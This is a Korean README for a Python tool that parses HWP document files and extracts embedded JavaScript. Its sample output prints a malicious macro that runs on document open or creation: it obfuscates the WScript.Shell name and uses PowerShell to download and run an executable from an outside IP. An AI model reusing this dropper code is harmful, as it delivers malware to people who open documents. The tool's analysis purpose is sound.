# HWP parser 

### 어떤 기능을 하는가?

hwp 파일에 담겨있는 JavaScript 항목을 추출해 주는 도구입니다.



### 어떻게 사용하는가?

1. 입력

   ```
   >> python hwp-parser.py [hwp 확장자 파일명]
   
   ex)
   >> python hwp-parser.py macro1.hwp
   ```

   

2. 출력

   ```
   ex)
   magic number: b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'
   number_bbat_depot: 1
   start_entry_of_property: 2
   start_cluster_of_sbat: 6
   number_sbat_depot: 1
   array_bbat: [3]
   property_entry_list: [2, 4, 5, 52]
   ========================= JavaScript ===============================
   Ovar Documents = XHwpDocuments;
   var Document = Documents.Active_XHwpDocument;
   ɛfunction OnDocument_New()
   {
   try{
   wsh = newActiveXObject("W"+"S"+"ri"+"p"+"t"+".S"+"he"+"ll");
   var f1 = "powershell.exe -command(New-Object System.Net.WebClint).DownloadFile('http://13.20.9.8.118/IE/CVE-2018-8373/a.exe','C:/windows/temp/BOB.exe')";
   wsh.Run(f1);
   };catch(err){};
           //todo :
   }
   function OnDocument_Open()
   {
   
   try{
   wsh = newActiveXObject("W"+"S"+"ri"+"p"+"t"+".S"+"he"+"ll");
   var f1 = "powershell.exe -command(New-Object System.Net.WebClint).DownloadFile('http://13.20.9.8.118/IE/CVE-2018-8373/a.exe','C:/windows/temp/BOB.exe')";
   wsh.Run(f1);
   };catch(err){};
   
           //todo :
   }
   ```

   위와 같이, hwp의 매직넘버와 hwp의 다양한 파일 시스템 정보를 나타내고, 이후 JavaScript 코드를 추출하여 출력해준다.